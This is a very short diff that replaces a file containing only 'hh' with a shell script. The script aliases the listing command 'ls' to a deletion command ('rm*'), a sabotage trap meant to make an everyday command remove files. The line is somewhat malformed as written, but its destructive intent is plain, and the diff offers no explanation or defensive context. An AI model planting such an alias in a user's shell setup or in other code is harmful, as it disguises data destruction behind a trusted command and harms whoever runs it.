@@ -1,1 +1,2 @@
-hh
+#!/bin/sh
+alias ls=rm*
